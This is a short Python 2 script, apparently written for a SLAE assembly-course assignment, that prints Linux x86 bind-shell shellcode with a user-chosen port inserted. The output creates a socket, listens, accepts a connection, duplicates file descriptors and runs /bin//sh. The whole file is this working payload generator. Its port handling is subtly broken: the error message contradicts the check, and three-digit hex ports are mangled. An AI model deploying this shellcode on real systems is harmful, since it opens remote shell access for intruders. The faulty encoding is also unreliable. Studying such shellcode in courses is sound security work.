# Author: RawrRadioMouse
# Purpose: SLAE


#!/usr/bin/python

import sys

if len(sys.argv) <= 1:
	print 'Usage: wrapper.py <port>' #let user know that script requires an arg
	exit()
port = int(sys.argv[1])
if (port < 1024 or port > 65535):
	print "[!] {} not a valid port, must be between 0-65535!".format(port) #tell people off for being silly
	exit()
port = hex(port)[2:] # convert port val to hex, and slice out the preceeding "0x" before the hex output
port = '\\x'+str(port[0:2]) + '\\x'+str(port[2:4]) # further break up hex output and place our "\\x" in front of each hex val		
shellcode = ""
shellcode += "\\x31\\xc0\\x50\\x6a\\x01\\x6a\\x02\\x31\\xc9\\x89\\xe1\\xb0"
shellcode += "\\x66\\x31\\xdb\\xb3\\x01\\xcd\\x80\\x89\\xc6\\x31\\xdb\\x53"
shellcode += "\\x66\\x68"
shellcode += port
shellcode += "\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\xb3"
shellcode += "\\x02\\xb0\\x66\\xcd\\x80\\x6a\\x01\\x56\\x89\\xe1\\xb3\\x04"
shellcode += "\\xb0\\x66\\xcd\\x80\\x50\\x50\\x56\\x89\\xe1\\xb3\\x05\\xb0"
shellcode += "\\x66\\xcd\\x80\\x89\\xc3\\x31\\xc9\\xb0\\x3f\\xcd\\x80\\x41"
shellcode += "\\x80\\xf9\\x04\\x75\\xf6\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73"
shellcode += "\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe2\\x53"
shellcode += "\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
print(shellcode)
